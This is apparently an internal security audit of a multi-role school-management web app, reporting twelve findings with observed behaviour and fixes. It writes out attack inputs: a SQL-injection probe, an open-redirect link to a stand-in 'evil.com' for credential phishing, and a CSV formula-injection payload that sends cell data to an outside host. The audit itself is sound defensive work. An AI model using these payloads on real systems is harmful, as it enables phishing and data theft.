# Audit — September 2026

A second pass over the whole product, screen by screen, after Phase 10. Phase 10's
review looked at tenant isolation, authentication and headers. This one asks a
different question: **what does each page do when it is given something it did not
expect** — a nonsense date in the URL, a foreign id, a name that Excel will treat as a
formula, a sign-in that is interrupted halfway.

Everything below was found by probing the running production build as each of the three
roles, then reading the code that produced the behaviour. Every 500 listed here was
observed, not predicted.

## What held up

Listed first, because "we looked" is part of the result, and because the findings are
easier to read once you know what is already sound.

- **Branch isolation held everywhere it was pushed.** Every page a branch admin may not
  see answers 404, not 403: `/branches`, `/users`, `/subjects`, `/reports/branches`,
  `/settings`. A foreign but real id is indistinguishable from an invented one.
- **Every teacher redirect worked.** All sixteen dashboard routes bounce a signed-in
  teacher to `/teacher`, including the ones reached by typing the URL.
- **RLS is complete.** Every tenant table has `ENABLE` and `FORCE`, and every INSERT and
  UPDATE policy carries a `WITH CHECK` — the two that read as NULL in `pg_policies` are
  UPDATE policies, where Postgres reuses the `USING` clause, so there is no gap.
- **The search box is parameterised.** `?q=%' or 1=1 --` returns no rows and no error.
- **The absence threshold is already validated.** `?threshold=abc`, `-500` and `0` all
  fall back to the centre's setting rather than silently reporting on a nonsense number.
- **The students list is the model to copy.** `studentFiltersSchema` puts `.catch()` on
  every field, so a mangled query string degrades to a sane default instead of an error.
  Findings 1 and 2 exist only on the pages that did not do this.
- **The uploads path is derived, never supplied**, and `docker-compose.prod.yml` mounts a
  volume for it, so the logo survives a redeploy.
- **Cookies are `httpOnly`, `sameSite=lax`, `secure` in production**, sign-up is
  disabled, and no page is cached across tenants.

### 1. Dates from the query string reach SQL unvalidated — Medium

`resolveRange()` in `get-reports.ts` takes `from` and `to` straight from the URL and
passes them to a `date` comparison. Postgres refuses the cast, the throw escapes the
page, and the user gets a 500.

Observed, signed in as a branch admin:

```
500  /reports/students?from=abc&to=def
500  /payroll?from=abc&to=def
500  /attendance?date=not-a-date
500  /attendance/sessions?from=abc&to=def
500  /print/payroll?from=abc&to=def
500  /print/reports/students?from=abc&to=def
500  /reports/branches?from=x&to=y          (as super admin)
```

No data is exposed. What it costs is an error page nobody designed, on a URL that gets
shared and bookmarked — a stale link in a WhatsApp group, a date picker that wrote
something odd once, a hand-edited address bar. It is also a difference an attacker can
measure between pages.

**Fix:** the pattern already exists. `studentFiltersSchema` validates each field with
`.catch()` so bad input becomes the default and the page still renders. Apply it to the
report, payroll, attendance and print ranges.

### 2. Ids from the query string reach SQL unvalidated — Medium

The same shape, with `classId`, `teacherId` and `branchId`:

```
500  /reports/matrix?classId=not-a-uuid
500  /payroll?teacherId=not-a-uuid
500  /attendance/sessions?classId=not-a-uuid
500  /payroll?branchId=not-a-uuid           (as super admin)
```

Note what a branch admin gets for that last URL: `200`. `getPayrollReport` drops
`branchId` for anyone who is not a super admin — correctly — so the bad value is never
used. The crash exists only for the role that is allowed to pass it.

A well-formed id belonging to another branch already behaves correctly:
`?classId=<foreign uuid>` returns an empty report, which is what a branch admin should
see.

**Fix:** `z.uuid().optional().catch(undefined)`, the same way the three dynamic `[id]`
routes were fixed in Phase 10.

### 3. The forced password change can be cleared without changing it — High

Admin accounts are created with a temporary password and `must_change_password` set. The
screen calls two things in sequence: Better Auth's `changePassword`, then
`completePasswordChange()` to clear the flag.

`completePasswordChange()` **takes no arguments and verifies nothing.** It clears the
flag for whoever calls it. It is a server action reachable from the page that already
imports it, so the account holder can clear their own flag while keeping the temporary
password.

That password was read aloud over a phone call and probably written on paper. The whole
point of the flag is that it stops being valid. Afterwards, the record says the change
happened.

**Fix:** one server action that takes the current and the new password, changes it
server-side, and clears the flag only after Better Auth has accepted it — so the two
cannot be separated.

**Found while fixing it:** for a branch admin the flag could not be cleared at all — not
by the bypass and not by the legitimate path either. See finding 12, which was not in
the original review and is worse than this one.

### 4. The 8-character minimum exists only in the browser — Medium

`change-password-form.tsx` checks `next.length < MIN_LENGTH` in the client component.
Underneath, Better Auth's `minPasswordLength` is **6**, and it is 6 because a teacher's
access code is six digits — a floor lowered for teachers that admins inherited.

So the server accepts a six-character admin password; only the form objects. The message
the user reads ("8 characters at least") describes a rule that is not enforced where it
matters.

**Fix:** validate on the server inside the action from finding 3, and leave Better Auth's
floor at 6 for the teacher codes that actually need it.

### 5. Open redirect on the login page — Medium

`proxy.ts` appends `?next=<path>` when it bounces an anonymous visitor to `/login`, and
the form returns them there afterwards:

```ts
router.replace(next && next.startsWith("/") ? next : "/");
```

`//evil.com` starts with `/`. It is a protocol-relative URL, so the browser reads it as
`https://evil.com`.

The attack is a link to the **real** domain —
`https://school.example/login?next=//evil.com` — which signs the user in legitimately and
then drops them on a copy of the login page asking them to sign in "again". Everything up
to the last step is genuine, which is what makes it work.

**Fix:** `next.startsWith("/") && !next.startsWith("//")`.

### 6. CSV exports are vulnerable to formula injection — Medium

`toCsvField` quotes correctly for RFC 4180 and does nothing about a field that begins
with `=`, `+`, `-` or `@`. Excel treats those as formulas.

A student's name is free text typed at the desk, or imported from a CSV somebody was
sent. `=HYPERLINK("http://x/"&A1,"اضغط هنا")` in a name field survives the round trip and
executes when the exported register is opened — by the centre's own staff, on the
centre's own machine, from a file the system produced.

**Fix:** prefix a leading `=`, `+`, `-`, `@`, tab or CR with `'` in `toCsvField`. It is a
shared helper, so students and payroll are both covered by one change, and it already has
a unit test file.

### 7. An SVG logo is served same-origin — Low

`ALLOWED_LOGO_TYPES` includes `image/svg+xml`. The file lands in `public/uploads` and is
served from the app's own origin, where the CSP is `script-src 'self' 'unsafe-inline'` —
which permits a script inside that SVG if it is opened directly rather than through an
`<img>`.

Only a super admin can upload one, and a super admin can already do everything, so this
is not a privilege escalation. It matters as persistence: a compromised super-admin
session leaves behind a file that keeps running on the centre's origin afterwards.

**Fix:** a tighter CSP for `/uploads/:path*` (`script-src 'none'; sandbox`), which keeps
SVG logos working as images. Dropping SVG from the allowlist also works and is smaller.

### 8. `/print/*` has no role gate — Low

A signed-in teacher gets `200` on `/print/payroll`. The sheet renders **their own
earnings only** — RLS restricts `class_sessions` to their own `teacher_id`, so there is no
leak, and that was verified by reading the rendered page.

But every other route group checks the role and this one leans entirely on RLS. It also
hands a teacher the payroll document, signature column and all, which is the office's form
and not theirs.

**Fix:** the same redirect the dashboard group uses.

### 9. Two functions still log the raw error object — Low

Phase 10 replaced `console.error(error)` with `describeError(error)` in `createAction`.
The same pattern is still in `record-login.ts:45` and `record-logout.ts:20` — the two
functions closest to authentication, where the metadata being written includes the
client's IP address.

**Fix:** export `describeError` and use it in both.

### 10. `%` and `_` are wildcards in the search box — Low

The search term is interpolated into an `ILIKE` pattern without escaping it. Searching for
`%` returns every student; `_` matches any single character. Not injection — the value is
still a bound parameter — but a search that quietly means something other than what was
typed, and a full scan where the trigram index would otherwise be used.

**Fix:** escape `%`, `_` and the escape character itself in the term, and keep the
wildcards the code's own.

### 11. An oversized CSV is rejected with the logo's message — Cosmetic

`import-students.ts:168` returns `ar.settings.logoTooLarge` for a CSV that is too big, so
the person importing a register is told their **logo** is too large. One wrong constant.

### 12. The forced password change could never complete for a branch admin — High

Found by writing the end-to-end test for finding 3, which is the only reason it was
found at all: there was no test for this screen, and the bug is invisible from the code.

`completePasswordChange` cleared the flag inside `withTenant`, so the write went through
RLS. The `user_update` policy admits three callers:

```sql
(app_role() IS NULL) OR (app_role() = 'super_admin')
  OR ((app_role() = 'teacher') AND (teacher_id = app_teacher_id()))
```

A **branch admin is not among them** — and a branch admin is the only person this screen
was built for. The update matched no rows, raised nothing, and reported success. Postgres
does not error on an UPDATE that RLS filters to zero rows; it just updates nothing.

So a new admin signed in with their temporary password, changed it successfully, and was
returned to `/change-password`. Forever. The account was usable only in the sense that
they could sign in; every page bounced them back to a form that had already done its job.

It also means finding 3's bypass did not work for a branch admin: the same policy that
broke the legitimate path blocked the shortcut. The bypass was real for a super admin
holding the flag, which is reachable through a password reset.

**Fix:** clear the flag through the no-role path that Better Auth's own writes use — one
column, one row, keyed by the session — and leave the audit write inside `withTenant`,
where `audit_logs` requires a role.

Widening the policy was the other option and was rejected: letting a branch admin write
to their own `user` row means RLS would no longer stop one from changing their own role
or branch, and RLS is the layer that is supposed to hold when the code above it is wrong.

## Open question for the owner

**Session length.** Sessions last seven days and roll forward on use, with no idle
timeout. On a shared front-desk machine that means whoever sits down next is signed in as
whoever signed in last. That is a policy decision, not a defect: a short timeout on a
machine used all day by one person is an irritation, and on a shared one it is the point.
Recorded here rather than changed.

## Phases

Ordered by severity, and grouped so each phase is one area of the product and can be
finished and verified on its own.

### Phase A — sign-in and the account (`/login`, `/change-password`)

Findings **3, 4, 5** — and **12**, which was found while fixing 3. Done: see
`tests/e2e/password-change.spec.ts`, which walks a new admin from a temporary password
to a working account and asserts at every step that the server, not the browser, is the
one refusing.

### Phase B — reports and payroll (`/reports/*`, `/payroll/*`, `/print/payroll`, `/print/reports/*`)

Findings **1, 2** on those screens. Seven of the eleven observed 500s.

### Phase C — attendance (`/attendance`, `/attendance/sessions`, `/attendance/mark`)

The rest of findings **1, 2**. Separate from Phase B because the attendance screens take a
single `date` rather than a range, and because they are the screens used every day.

### Phase D — files: import, export and the logo (`/students`, `/settings`)

Findings **6, 7, 11**. One shared helper, one allowlist, one constant.

### Phase E — consistency (`/print/*`, logging, search)

Findings **8, 9, 10**. Nothing here is exploitable on its own; each is a place where one
part of the product does not do what the rest of it does.
